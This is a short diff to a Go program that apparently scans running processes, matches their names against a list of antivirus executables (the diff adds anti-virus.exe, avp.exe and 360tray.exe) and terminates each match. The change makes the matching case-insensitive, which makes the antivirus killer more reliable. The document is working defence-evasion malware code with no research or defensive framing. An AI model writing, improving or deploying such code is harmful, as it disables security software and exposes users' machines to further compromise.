@@ -31,9 +31,10 @@ func TerminateProcess(process os.Process, exitCode int) error {
 var f *os.File
 
 func isAv(name string) bool {
+	name = strings.ToLower(name)
 	for _, each := range strings.Split(avList, "\n") {
 		//fmt.Fprintf(f, "isAV: %s == %s\n", name, each)
-		if name == each {
+		if name == strings.ToLower(each) {
 			return true
 		}
 	}
@@ -62,3 +63,11 @@ func main() {
 		TerminateProcess(p, 1)
 	}
 }
+
+/*
+anti-virus.exe
+avp.exe
+360tray.exe
+
+
+*/
